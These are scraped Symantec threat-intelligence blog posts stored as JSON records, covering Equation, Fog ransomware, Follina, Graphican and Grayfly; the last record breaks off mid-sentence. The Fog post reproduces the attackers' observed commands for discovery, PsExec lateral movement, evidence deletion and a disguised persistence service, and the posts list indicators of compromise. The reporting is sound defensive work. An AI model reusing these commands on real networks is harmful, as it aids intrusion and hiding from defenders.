{"id":135,"title":"Equation: Advanced cyberespionage group has all the tricks in the book, and more | Symantec Enterprise Blogs","publish_date":null,"link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/equation-cyberespionage-group","clean_text":"Equation: Advanced cyberespionage group has all the tricks in the book, and more Group uses range of different malware tools to mount its operations.\nAn adept and well-resourced cyberespionage group known as Equation has been targeting organizations in a number of countries with a range of highly developed malware tools that go to great lengths to evade detection.\nNew research from our peers at Kaspersky Lab has brought the group’s activities and tools to public attention.\nSymantec products detect the malware currently known to be used by Equation.\nThe Equation group has used a range of different malware tools to mount its operations.\nTargeted computers are often compromised initially with malware that acts as a reconnaissance tool, gathering information about the infected computer and keeping a back door open, allowing for the installation of further malware if the computer is identified as something of interest.\nThis is a common tactic adopted by cyberespionage groups.\nFor example, the group behind the Turla Trojan usually initially infects its victims with the Wipbot Trojan before infecting them with Trojan Turla if it decides the computer is worthy of interest.\nThe main tool used for this purpose appears to be Infostealer.\nMicstus, which is also known as “DoubleFantasy”.\nTrojan.\nTripfant (also known as “TripleFantasy”) has similar capabilities and may be a replacement for Micstus.\nEquation has used a succession of advanced, multipurpose Trojans as its main malware tools.\nTrojan.\nGrayphish, which is also known as “GrayFish”, is believed to be the group’s current weapon of choice.\nIt has a complex structure and stealthy characteristics.\nGrayphish includes a bootkit which allows the malware to take control of the entire Windows boot process.\nHighly stealthy, Grayphish uses an encrypted virtual file system hidden inside the Windows registry.\nThis appears to have replaced the older Trojan.\nEqudrug (also known as “EquationDrug”) which was favored until recently.\nEqudrug in turn appears to have replaced the older Backdoor.\nLassrv.\nB. Also known as “EquationLaser”, this Trojan seems to be one of the early workhorses used by the group until it was phased out.\nGrayphish and Equdrug have a modular structure.\nAside from standard modules, a number of specialized features can also be employed.\nAmong this is a highly sophisticated and rarely used module that allows the malware to reprogram the firmware on a range of popular hard disks, providing the attackers with a persistent presence that can survive disk reformatting.\nSymantec detects this module as Packed.\nGeneric.483.\nIn addition to these powerful Trojans, Equation has employed a number of specialist tools.\nAmong these are Trojan.\nGrokey a custom keylogger (also known as “Grok”) and W32.Fanni, which is also known as “Fanny worm”.\nThis worm’s chief purpose appears to be the targeting of air-gapped networks.\nIt can receive commands and exfiltrate data through infected USB sticks.\nFanny used two zero day exploits that were also used in the Stuxnet attacks.\nThe exploits were used in Fanny prior to Stuxnet indicating that Equation had prior knowledge of the vulnerabilities.\nAnother similarity lies in the fact that Stuxnet was also designed to attack air-gapped networks.\nProtection Symantec and Norton products have the following detections in place against malware used by the Equation group: AV: - Infostealer.\nMicstus, - Trojan.\nTripfant - Trojan.\nGrayphish - Trojan.\nEqudrug - Backdoor.\nLassrv.\nB - Packed.\nGeneric.483 - Trojan.\nGrokey - W32.Fanni IPS: - System Infected: Trojan Equation Activity Prior to this, Symantec detected Equation malware with a range of detections including Trojan.\nTracur, Backdoor.\nTrojan, Trojan Horse, Trojan.\nGen.2, and W32.Stration@mm.\nWant to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":50,"metadata":{"source":"blog","platform":"symantec","filename":"Equation"}}
{"id":136,"title":"Fog Ransomware: Unusual Toolset Used in Recent Attack | Symantec Enterprise Blogs","publish_date":"2025-05-28","link":"https://www.security.com/threat-intelligence/fog-ransomware-attack","clean_text":"Fog Ransomware: Unusual Toolset Used in Recent Attack Legitimate employee monitoring software and various pentesting tools deployed.\nA May 2025 attack on a financial institution in Asia saw the Fog ransomware deployed, alongside an unusual toolset, including some dual-use and open-source pentesting tools we have not observed being used in ransomware attacks previously.\nThe attackers used a legitimate employee monitoring software called Syteca (formerly Ekran), which is highly unusual and not something we have seen used in a ransomware attack chain before.\nThey also deployed several open-source pentesting tools – GC2, Adaptix, and Stowaway – which are not commonly used during ransomware attacks.\nAlso notable in this attack was that, a few days after the ransomware was deployed, the attackers created a service to establish persistence.\nThis is an unusual step to see in a ransomware attack, with malicious activity usually ceasing on a network once the attackers have exfiltrated data and deployed the ransomware, but the attackers in this incident appeared to wish to retain access to the victim’s network.\nThe attackers were on the target’s network for about two weeks before they deployed the ransomware.\nFog ransomware The Fog ransomware was first documented in May 2024, and initially appeared to be primarily focused on targeting educational institutions in the U.S. In those early attacks, attackers using Fog gained initial access to networks by leveraging compromised VPN credentials.\nIt was reported in October 2024 that attackers using Fog were targeting a critical vulnerability (CVE-2024-40711 - CVSS 9.8) in the Veeam Backup & Replication (VBR) servers that was patched in September 2024.\nMeanwhile, in April 2025, Fog attackers were reported to be using email as an initial infection vector in ransomware attacks in which the language used in the ransom notes appeared to be mocking Elon Musk’s Department of Government Efficiency (DOGE) in an effort to goad victims.\nAlso notable in that attack campaign was that the ransom notes also offered a “decrypt for free” option if the victim chose to spread the ransomware to somebody else's computer.\nToolset The initial infection vector used by the attackers in this recent incident isn't known.\nTwo of the infected machines were Exchange Servers.\nWhile there was no evidence to suggest they were the initial infection vector, exploiting vulnerabilities in Exchange Servers is a common initial infection vector for ransomware actors.\nThe first suspicious activity on the network was the installation of multiple open-source, post-exploitation penetration testing tools, including variants of the GC2 tool, which is an open-source tool that allows an attacker to execute commands on target machines using Google Sheets or Microsoft SharePoint List and exfiltrate files using Google Drive or Microsoft SharePoint documents.\nThe GC2 implant polls the Google Sheet or SharePoint List for each operator command, then uses it to store its output, a log, and records the execution polling interval it is configured with.\nIt is used by the attackers for various discovery commands.\nwhoami net use cmd /c \"ipconfig /all\" cmd /c \"netstat -anot|findstr 3389\" When communicating with the remote attacker, the GC2 tool also checks for the following commands: - \"exit\" - \"load\" (added functionality): loads arbitrary file and executes it as shellcode - \"upload\" - \"download\" It contains two embedded configuration blobs in encoded form.\nThis tool is not something we have seen used in ransomware attacks before, though it was used in an attack carried out by Chinese nation-state backed actor APT41 in 2023.\nThe open-source Stowaway proxy tool was used to deliver the Syteca (formerly Ekran) executable.\nIt is not clear exactly what the Syteca tool was used for by the attackers.\nIn the attack, the file is named 'sytecaclient.exe', but it also appears with the name 'update.exe.'\nSyteca is legitimate employee monitoring software that can record onscreen activity and monitor keystrokes, among other capabilities.\nSeveral libraries are loaded by this executable, suggesting it was possibly used for information stealing or spying, which would be the most likely reason the attackers would deploy it given the keylogging and screen capture capabilities of the tool.\nCSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\x86\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper_7.20.576.0.dll\"\" Several commands that look like they are removing or killing the Syteca executable are also executed.\nThis appears to be an attempt by the attackers to delete indicators and evidence of their activity on the network in an effort to avoid detection.\nCSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClient.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClientSession.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranController.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"grpcwebproxy.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"PamConnectionManager.exe\" CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbdriverinstaller.exe\" -u [REDACTED] CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbolddriveruninstaller.exe PsExec was also used to remove the Syteca client configuration file and binary in another attempt by the attackers to delete evidence of the presence of Syteca on the network: psexec64.exe -accepteula \\\\192.168.8.52 -u ,?\n> -p ,?\n> -h -s cmd /c \"del C:\\users\\public\\SytecaClient.ini\" psexec64.exe -accepteula \\\\192.168.8.150 -u ,?\n> -p ,?\n> -h -s cmd /c \"rm C:\\users\\public\\SytecaClient.exe\" PsExec and SMBExec were also used alongside Syteca and GC2 for lateral movement across the victim network.\nSMBExec was used to launch Syteca: cmd.exe /Q /c SytecaClient.exe 1> \\\\127.0.0.1\\ADMIN$\\__1748095766.8385904 2>&1 PsExec was used to laterally execute a suspected process watchdog/launcher for the GC2 backdoor: psexec64.exe -accepteual \\\\192.168.8.52 -u ,?\n> -p ,?\n> -h -s cmd /c \"CSIDL_COMMON_APPDATA\\microsoft\\devicesync\\windowsdevicesync.exe\" SMBExec and PsExec are both living off the land tools that are commonly used by ransomware attackers: - PsExec: Microsoft Sysinternals tool for executing processes on other systems.\nThe tool is primarily used by attackers to move laterally on victim networks. -\nSMBExec: Open-source lateral movement tool.\nFor data theft, the attackers download multiple file transfer utilities - Freefilesync and MegaSync - as well as using 7-zip to archive sensitive directories. -\n7-zip: Legitimate open-source file archiver with a high compression ratio. -\nFreeFileSync: An open-source folder comparison and synchronization tool. -\nMegaSync: A synchronization tool for the Mega file hosting platform.\nOther tools used on the target’s network include the Adaptix C2 Agent Beacon, which is a component of an open-source extensible post-exploitation and adversarial emulation framework, Adaptix C2, designed for use by penetration testers.\nThe variant used on the target’s network in this incident contained a configuration blob in encrypted form.\nAdaptix can be considered a sort of open-source alternative to the well-known Cobalt Strike framework.\nThe Adaptix beacon agent is similar to Cobalt Strike beacon; once implanted on a victim machine, it calls back to the attacker and provides command and control (C&C) access.\nThe attackers also used Process Watchdog, a program that continuously enumerates running processes to check for a specific process, in this case the GC2 process, which has the filename AppxModels.exe and, if not found on a machine, Process Watchdog creates the process.\nC:\\ProgramData\\Microsoft\\Windows\\Models\\AppxModels.exe On the day the Fog ransomware was deployed, the Impacket SMB tool was also used, suggesting this may have been used to deploy the ransomware.\nNotably, several days after the ransomware was deployed, a service was run to establish persistence on the victim network.\nThis is likely another process watchdog used to launch one of the attacker’s command and control tools, such as GC2.\nsc create SecurityHealthIron binPath= \"CSIDL_SYSTEM\\diagsvcs\\runtimebroker.exe\" start= auto DisplayName= \"Collect performance information about an application by using command-line tools.\"\nsc start SecurityHealthIron An unusual ransomware attack There are a few things that mark this ransomware attack out as unusual.\nThe toolset deployed by the attackers is quite atypical for a ransomware attack.\nThe Syteca client and GC2 tool are not tools we have seen deployed in ransomware attacks before, while the Stowaway proxy tool and Adaptix C2 Agent Beacon are also unusual tools to see being used in a ransomware attack.\nThe attackers establishing persistence on a victim network having deployed the ransomware is also not something we would typically see in a ransomware attack.\nThese factors mean it could be possible that this company may in fact have been targeted for espionage purposes, with the ransomware attack merely a decoy, or perhaps also deployed in an attempt by the attackers to make some money while also carrying out their espionage activity.\nWhat we can say with certainty is that this was an unusual toolset to see in a ransomware attack and is worth noting for businesses and corporations wanting to guard against attacks by malicious actors.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\nFile indicators 181cf6f9b656a946e7d4ca7c7d8a5002d3d407b4e89973ecad60cee028ae5afa – Fog ransomware 90a027f44f7275313b726028eaaed46f6918210d3b96b84e7b1b40d5f51d7e85 – Process Watchdog f6cfd936a706ba56c3dcae562ff5f75a630ff5e25fcb6149fe77345afd262aab – Process Watchdog fcf1da46d66cc6a0a34d68fe79a33bc3e8439affdee942ed82f6623586b01dd1 – Process Watchdog 4d80c6fcd685961e60ba82fa10d34607d09dacf23d81105df558434f82d67a5e – Likely Process Watchdog 8ed42a1223bfaec9676780137c1080d248af9ac71766c0a80bed6eb4a1b9b4f1 – Likely Process Watchdog e1f571f4bc564f000f18a10ebb7ee7f936463e17ebff75a11178cc9fb855fca4 – Likely Process Watchdog f1c22cbd2d13c58ff9bafae2af33c33d5b05049de83f94b775cdd523e393ec40 – Likely Process Watchdog 279f32c2bb367cc50e053fbd4b443f315823735a3d78ec4ee245860043f72406 – Likely Process Watchdog b448321baae50220782e345ea629d4874cbd13356f54f2bbee857a90b5ce81f6 – Likely Process Watchdog f37c62c5b92eecf177e3b7f98ac959e8a67de5f8721da275b6541437410ffae1 – GC2-sheet 3d1d4259fc6e02599a912493dfb7e39bd56917d1073fdba3d66a96ff516a0982 – GC2-sheet 982d840de531e72a098713fb9bd6aa8a4bf3ccaff365c0f647e8a50100db806d – Likely GC2-sheet fd9f6d828dea66ccc870f56ef66381230139e6d4d68e2e5bcd2a60cc835c0cc6 – Syteca executable bb4f3cd0bc9954b2a59d6cf3d652e5994757b87328d51aa7b1c94086b9f89be0 – Stowaway ba96c0399319848da3f9b965627a583882d352eb650b5f60149b46671753d7dd – Adaptix C2 Beacon Agent 44bb7d9856ba97271d8f37896071b72dfbed2d9fb6c70ac1e70247cddbd54490 – Likely Adaptix C2 Beacon Agent 13d70c27dfa36ba3ae1b10af6def9bf34de81f6e521601123a5fa5b20477f277 – Stowaway Network IOCs 66.112.216[.]232 amanda[.]protoflint[.]com 97.64.81[.]119 Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":59,"metadata":{"source":"blog","platform":"symantec","filename":"Fog"}}
{"id":137,"title":"Attackers Exploit MSDT Follina Bug to Drop RAT, Infostealer | Symantec Enterprise Blogs","publish_date":null,"link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/follina-msdt-exploit-malware","clean_text":"Attackers Exploit MSDT Follina Bug to Drop RAT, Infostealer Symantec has observed threat actors exploiting remote code execution flaw to drop AsyncRAT and information stealer.\nSymantec, a division of Broadcom Software, has observed threat actors exploiting the remote code execution (RCE) vulnerability known as Follina to drop malware onto vulnerable systems just days after the flaw became public on May 27, 2022.\nWhat is Follina?\nFollina (CVE-2022-30190) is a vulnerability in the Microsoft Support Diagnostic Tool (MSDT) that allows remote code execution on vulnerable systems through the ms-msdt protocol handler scheme.\nThe bug is present in all supported versions of Windows.\nThe vulnerability can be easily exploited by a specially crafted Word document that downloads and loads a malicious HTML file through Word’s remote template feature.\nThe HTML file ultimately allows the attacker to load and execute PowerShell code within Windows.\nThe vulnerability can also be exploited through the RTF file format.\nExploiting the flaw does not require the use of macros, eliminating the need for an attacker to trick victims into enabling macros for an attack to work.\nMicrosoft has since released advisories and workarounds to mitigate the vulnerability.\nAttackers quick to take advantage Since the details of the vulnerability started surfacing online, attackers were quick to start taking advantage of the flaw to install their payloads.\nSymantec has observed attackers using a similar HTML file to that used in the initial attack.\nWhen the HTML document is executed in the context of WinWord, msdt.exe gets spawned as a child process.\nThat is because of the protocol handler entry in the registry.\nSdiagnhost.exe is then invoked, which is the Scripted Diagnostics Native Host, and under this process the final payload process is created - in our case PowerShell.\nMultiple attackers are using a variety of payloads at the end of successful exploitation.\nIn one of the instances, Symantec observed the attackers deploying the remote access Trojan AsyncRAT, which had a valid digital signature.\nWhen AsyncRAT runs, it carries out the anti-analysis checks shown in Figure 4.\nLater, AsyncRAT collects information about the infected system, including hardware identification, user name, executed path, and operating system information, and sends it to a command-and-control (C&C) server.\nAsyncRAT then waits for commands from the C&C server and executes those commands on the victim machine.\nSymantec has also observed attackers deploying an information stealer as a payload.\nThe code shown in Figure 6 is a snippet from the malware, which steals information including cookies and saved login data from web browsers such as Firefox, Chrome, and Edge.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nSymantec protects against these attacks with the following definitions: File-based - Downloader - Backdoor.\nASync - InfoStealer Network-based Indicators of Compromise If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\ne7faa6c18d4906257652253755cf8f9a739c10938db369878907f8ed7dd8524d b63fbf80351b3480c62a6a5158334ec8e91fecd057f6c19e4b4dd3febaa9d447 8e0be5e1035777f2ea373593c214d29ad146dd0453e9b8a1cad16d787c0be632 Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":27,"metadata":{"source":"blog","platform":"symantec","filename":"Follina"}}
{"id":138,"title":"Graphican: Flea Uses New Backdoor in Attacks Targeting Foreign Ministries | Symantec Enterprise Blogs","publish_date":"2022-07-28","link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/flea-backdoor-microsoft-graph-apt15","clean_text":"Graphican: Flea Uses New Backdoor in Attacks Targeting Foreign Ministries Backdoor leverages Microsoft Graph API for C&C communication.\nThe Flea (aka APT15, Nickel) advanced persistent threat (APT) group continued to focus on foreign ministries in a recent attack campaign that ran from late 2022 into early 2023 in which it leveraged a new backdoor called Backdoor.\nGraphican.\nThis campaign was primarily focused on foreign affairs ministries in the Americas, although the group also targeted a government finance department in a country in the Americas and a corporation that sells products in Central and South America.\nThere was also one victim based in a European country, which was something of an outlier.\nThis victim had also previously suffered a seemingly unrelated ransomware attack in July 2022.\nHowever, the primary focus of the campaign observed by the Threat Hunter Team at Symantec, part of Broadcom, does appear to be on ministries of foreign affairs in the Americas.\nFlea has a track record of honing in on government targets, diplomatic missions, and embassies, likely for intelligence-gathering purposes.\nTools Flea used a large number of tools in this campaign.\nAs well as the new Graphican backdoor, the attackers leveraged a variety of living-off-the-land tools, as well as tools that have been previously linked to Flea.\nWe will detail these tools in this section.\nBackdoor.\nGraphican Graphican is an evolution of the known Flea backdoor Ketrican, which itself was based on a previous malware — BS2005 — also used by Flea.\nGraphican has the same basic functionality as Ketrican, with the difference between them being Graphican’s use of the Microsoft Graph API and OneDrive to obtain its command-and-control (C&C) infrastructure.\nThis technique was used in a similar way by the Russian state-sponsored APT group Swallowtail (aka APT28, Fancy Bear, Sofacy, Strontium) in a campaign in 2022 in which it delivered the Graphite malware.\nIn that campaign, the Graphite malware used the Microsoft Graph API and OneDrive as a C&C server.\nThe observed Graphican samples did not have a hardcoded C&C server, rather they connected to OneDrive via the Microsoft Graph API to get the encrypted C&C server address from a child folder inside the \"Person\" folder.\nThe malware then decoded the folder name and used it as a C&C server for the malware.\nAll instances of this variant used the same parameters to authenticate to the Microsoft Graph API.\nWe can assume they all have the same C&C, which can be dynamically changed by the threat actors.\nOnce on a machine, Graphican does the following: - Disables the Internet Explorer 10 first run wizard and welcome page via registry keys - Checks if the iexplore.exe process is running - Creates a global IWebBrowser2 COM object to access the internet - Authenticates to the Microsoft Graph API to get a valid access token and a refresh_token - Using the Graph API it enumerates the child files and folders inside the “Person” folder in OneDrive - Obtains the name of the first folder and decrypts it to use it as a C&C server - Generates a Bot ID based on the hostname, local IP, Windows version, the system default language identifier, and the process bitness (32-bit or 64-bit) of the compromised machine - Registers the bot into the C&C with the format string \"f$$$%s&&&%s&&&%s&&&%d&&&%ld&&&%s\" or \"f@@@%s###%s###%s###%d###%ld###%s\" filled with the previously collected information from the victim’s computer - Polls C&C server for new commands to execute Commands that can be executed by Graphican include: - 'C' — Creates an interactive command line that is controlled from the C&C server - 'U' — Creates a file on the remote computer - 'D' — Downloads a file from the remote computer to the C&C server - 'N' — Creates a new process with a hidden window - 'P' — Creates a new PowerShell process with a hidden window and saves the results in a temporary file in the TEMP folder and sends the results to the C&C server During the course of this campaign, we also observed an updated version of Ketrican, which had a hardcoded C&C server and only implemented the ‘C’, ‘U’, and ‘D’ commands.\nWe also saw an older version of Ketrican (compiled in 2020) that implemented only the ‘N’ and ‘P’ commands.\nThis demonstrates that the group is actively developing and adapting Ketrican to suit its objectives.\nOther Tools Other tools leveraged by Flea in this recent activity include: - EWSTEW — This is a known Flea backdoor that is used to extract sent and received emails on infected Microsoft Exchange servers.\nWe saw new variants of this tool being used in this campaign. -\nMimikatz, Pypykatz, Safetykatz — Mimikatz is a publicly available credential-dumping tool.\nIt allows a local attacker to dump secrets from memory by exploiting Windows single sign-on functionality.\nPupykatz and Safetykatz are Mimikatz variants with the same functionality. -\nLazagne — A publicly available, open-source tool designed to retrieve passwords from multiple applications. -\nQuarks PwDump — Quarks PwDump is an open-source tool that can dump various types of Windows credentials: local accounts, domain accounts, and cached domain credentials.\nIt was reported as being used in a campaign that Kaspersky called IceFog all the way back in 2013. -\nSharpSecDump — The .Net port of the remote SAM and LSA Secrets dumping functionality of Impacket's secretsdump.py. -\nK8Tools - This is a publicly available toolset with a wide variety of capabilities, including privilege escalation, password cracking, a scanning tool, and vulnerability utilization.\nIt also contains exploits for numerous known vulnerabilities in various systems. -\nEHole — A publicly available tool that can help attackers identify vulnerable systems. -\nWeb shells — The attackers use a number of publicly available web shells, including AntSword, Behinder, China Chopper, and Godzilla.\nWeb shells provide a backdoor onto victim machines.\nSome of these web shells, such as China Chopper and Behinder, are associated with Chinese threat actors. -\nExploit of CVE-2020-1472 — This is an elevation of privilege vulnerability that exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC).\nAn attacker who successfully exploits the vulnerability could run a specially crafted application on a device on the network.\nA patch has been available for this vulnerability since the first quarter of 2021.\nFlea Background Flea has been in operation since at least 2004.\nOver that time its tactics, techniques, and procedures (TTPs), as well as its targeting, have changed and developed.\nIn recent years, the group has primarily focused on attacks against government organizations, diplomatic entities, and non-governmental organizations (NGOs) for the purposes of intelligence gathering.\nNorth and South America does appear to have become more of a focus for the group in recent times, which aligns with the targeting we saw in this campaign.\nThe goal of the group does seem to be to gain persistent access to the networks of victims of interest for the purposes of intelligence gathering.\nIts targets in this campaign, of ministries of foreign affairs, also point to a likely geo-political motive behind the campaign.\nFlea traditionally used email as an initial infection vector, but there have also been reports of it exploiting public-facing applications, as well as using VPNs, to gain initial access to victim networks.\nMicrosoft seized domains belonging to Flea in December 2021.\nThe company seized 42 domains that it said were used in operations that targeted organizations in the U.S. and 28 other countries for intelligence-gathering purposes.\nFlea was also linked in a November 2022 report by Lookout to a long-running campaign targeting Uyghur-language websites and social media in China.\nFlea is believed to be a large and well-resourced group, and it appears that exposure of its activity, and even takedowns such as that detailed by Microsoft, have failed to have a significant impact when it comes to stopping the group’s activity.\nNew Backdoor and Notable Technique The use of a new backdoor by Flea shows that this group, despite its long years of operation, continues to actively develop new tools.\nThe group has developed multiple custom tools over the years.\nThe similarities in functionality between Graphican and the known Ketrican backdoor may indicate that the group is not very concerned about having activity attributed to it.\nThe most noteworthy thing about Graphican itself is the abuse of the Microsoft Graph API and OneDrive to obtain its C&C server.\nThe fact that a similar technique was used by Swallowtail, an unconnected APT group operating out of a different region, is also worth noting.\nOnce a technique is used by one threat actor, we often see other groups follow suit, so it will be interesting to see if this technique is something we see being adopted more widely by other APT groups and cyber criminals.\nFlea’s targets — foreign ministries — are also interesting; though they do align with the targets the group has directed its activity at in the past.\nIt appears the Flea’s interests remain similar to what they have been in recent years, even as its tools and techniques continue to evolve.\nProtection For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\n| IOC | Description | |---|---| | SHA256 file hashes | | | 4b78b1a3c162023f0c14498541cb6ae143fb01d8b50d6aa13ac302a84553e2d5 | Backdoor.\nGraphican | | a78cc475c1875186dcd1908b55c2eeaf1bcd59dedaff920f262f12a3a9e9bfa8 | Backdoor.\nGraphican | | 02e8ea9a58c13f216bdae478f9f007e20b45217742d0fbe47f66173f1b195ef5 | Backdoor.\nGraphican | | 617589fd7d1ea9a228886d2d17235aeb4a68fabd246d17427e50fb31a9a98bcd | Backdoor.\nKetrican | | 858818cd739a439ac6795ff2a7c620d4d3f1e5c006913daf89026d3c2732c253 | Backdoor.\nKetrican | | fd21a339bf3655fcf55fc8ee165bb386fc3c0b34e61a87eb1aff5d094b1f1476 | Backdoor.\nKetrican | | 177c4722d873b78b5b2b92b12ae2b4d3b9f76247e67afd18e56d4e0c0063eecf | Backdoor.\nKetrican | | 8d2af0e2e755ffb2be1ea3eca41eebfcb6341fb440a1b6a02bfc965fe79ad56b | Backdoor.\nKetrican | | f98bd4af4bc0e127ae37004c23c9d14aa4723943edb4622777da8c6dcf578286 | Backdoor.\nKetrican | | 865c18480da73c0c32a5ee5835c1cfd08fa770e5b10bc3fb6f8b7dce1f66cf48 | Backdoor.\nKetrican | | d30ace69d406019c78907e4f796e99b9a0a51509b1f1c2e9b9380e534aaf5e30 | Backdoor.\nKetrican | | bf4ed3b9a0339ef80a1af557d0f4e031fb4106a04b0f72c85f7f0ff0176ebb64 | EWSTEW | | 5600a7f57e79acdf711b106ee1c360fc898ed914e6d1af3c267067c158a41db6 | EWSTEW | | f06692b482d39c432791acabb236f7d21895df6f76e0b83992552ab5f1b43c8d | EWSTEW | | af4a10cbe8c773d6b1cfb34be2455eb023fb1b0d6f0225396920808fefb11523 | EWSTEW | | 548ce27996e9309e93bf0bd29c7871977530761b2c20fc7dc3e2c16c025eb7bc | EWSTEW | | 9829c86fab4cbccb5168f98dcb076672dc6d069ddb693496b463ad704f31722e | EWSTEW | | 18560596e61eae328e75f4696a3d620b95db929bc461e0b29955df06bc114051 | Mimikatz | | f6f57fc82399ef3759dcbc16b7a25343dea0b539332dacdf0ed289cc82e900db | Mimikatz | | df6a740b0589dbd058227d3fcab1f1a847b4aa73feab9a2c157af31d95e0356f | Mimikatz | | c559eb7e2068e39bd26167dd4dca3eea48e51ad0b2c7631f2ed6ffcba01fb819 | Pypykatz | | 7d93862c021d56b4920cab5e6cb30a2d5fb21478e7158f104e520cc739a1678d | Pypykatz | | 17a63ccd749def0417981c42b0765f7d56e6be3092a1f282b81619ca819f82ef | Pypykatz | | b42f9571d486a8aef5b36d72c1c8fff83f29cac2f9c61aece3ad70537d49b222 | Safetykatz | | bff65d615d1003bd22f17493efd65eb9ffbfe9a63668deebe09879982e5c6aa8 | CVE-2020-1472 | | ed2f501408a7a6e1a854c29c4b0bc5648a6aa8612432df829008931b3e34bf56 | Lazagne | | e7a6997e32ca09e78682fc9152455edaa1f9ea674ec51aecd7707b1bbda37c2f | Pwdump | | 07fc745c29db1e2db61089d8d46299078794d7127120d04c07e0a1ea6933a6df | Pwdump | | 42379bb392751f6a94d08168835b67986c820490a6867c28a324a807c49eda3b | Pwdump | | a6cad2d0f8dc05246846d2a9618fc93b7d97681331d5826f8353e7c3a3206e86 | Pwdump | | e25cc57793f0226ff31568be1fce1e279d35746016fc086a6f67734d26e305a0 | Pwdump | | 617af8e063979fe9ca43479f199cb17c7abeab7bfe904a2baf65708df8461f6d | Pwdump | | dc2423e21752f431ce3ad010ce41f56914e414f5a88fd3169e78d4cc08082f7b | Pwdump | | f653e93adf00cf2145d4bfa00153ae86905fe2c2d3c1f63e8f579e43b7069d51 | Pwdump | | 65436d5646c2dbb61607ed466132302f8c87dab82251f9e3f20443d5370b7806 | Hadmad | | 44c1c5c92771c0384182f72e9866d5fed4fda896d90c931fe8de363ed81106cf | Hadmad | | 7fa350350fc1735a9b6f162923df8d960daffb73d6f5470df3c3317ae237a4e6 | AntswordLoader | | 9a94483a4563228cb698173c1991c7cf90726c2c126a3ce74c66ba226040f760 | BehinderWebshell | | f4575af8f42a1830519895a294c98009ffbb44b20baa170a6b5e4a71fd9ba663 | BehinderWebshell | | 2da9a09a14c52e3f3d8468af24607602cca13bc579af958be9e918d736418660 | JSPWebshell | | d21797e95b0003d5f1b41a155cced54a45cd22eec3f997e867c11f6173ee7337 | PHPWebshell | | 31529b8b86d4b6a99d8f3b5f4b1f1b67f3c713c11b83b71d8df7d963275c5203 | China Chopper | | 7d3f6188bfdde612acb17487da1b0b1aaaeb422adc9e13fd7eb61044bac7ae08 | Sharpsecdump | | 2b60e49e85b21a439855b5cb43cf799c1fb3cc0860076d52e41d48d88487e6d8 | Sharpsecdump | | 819d0b70a905ae5f8bef6c47423964359c2a90a168414f5350328f568e1c7301 | K8Tools | | 7aa10e5c59775bfde81d27e63dfca26a1ec38065ddc87fe971c30d2b2b72d978 | EHole | | Network Indicators | | | 172.104.244[.]187 | | | 50.116.3[.]164 | | | www.beltsymd[.]org | | | www.cyclophilit[.]com | | | www.cyprus-villas[.]org | | | www.perusmartcity[.]com | | | www.verisims[.]com | Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":75,"metadata":{"source":"blog","platform":"symantec","filename":"Graphican"}}
{"id":139,"title":"Grayfly: Chinese Threat Actor Uses Newly-discovered Sidewalk Malware | Symantec Enterprise Blogs","publish_date":"2017-03-28","link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/grayfly-china-sidewalk-malware","clean_text":"Grayfly: Chinese Threat Actor Uses Newly-discovered Sidewalk Malware Recent campaigns involved exploits against Exchange and MySQL servers.\nGroup has heavy focus on telecoms sector.\nSymantec, part of Broadcom Software, has linked the recently discovered Sidewalk backdoor to the China-linked Grayfly espionage group.\nThe malware, which is related to the older Crosswalk backdoor (Backdoor.\nMotnug) has been deployed in recent Grayfly campaigns against a number of organizations in Taiwan, Vietnam, the United States, and Mexico.\nA feature of this recent campaign was that a large number of targets were in the telecoms sector.\nThe group also attacked organizations in the IT, media, and finance sectors.\nSidewalk was recently documented by ESET, who attributed it to a new group it called SparklingGoblin, which it linked to the Winnti malware family.\nSymantec’s Threat Hunter Team has attributed Sidewalk to Grayfly, a longstanding Chinese espionage operation.\nMembers of the group were indicted in the U.S. in 2020.\nThe recent campaign involving Sidewalk suggests that Grayfly has been undeterred by the publicity surrounding the indictments.\nWho are Grayfly?\nGrayfly (aka GREF and Wicked Panda) is a targeted attack group that has been active since at least March 2017 using a custom backdoor known as Backdoor.\nMotnug (aka TOMMYGUN/CROSSWALK), a custom loader called Trojan.\nChattak, Cobalt Strike (aka Trojan.\nAgentemis), and ancillary tools in its attacks.\nGrayfly has been observed targeting a number of countries in Asia, Europe, and North America across a variety of industries, including food, financial, healthcare, hospitality, manufacturing, and telecommunications.\nIn more recent activity, Grayfly has continued with its focus on telecommunications but has also been observed targeting organizations operating within the media, finance, and IT service provider sectors.\nTypically Grayfly targets publicly facing web servers to install web shells for initial intrusion, before spreading further within the network.\nOnce a network has been compromised, Grayfly may install its custom backdoors onto additional systems.\nThese tools allow the attackers to have 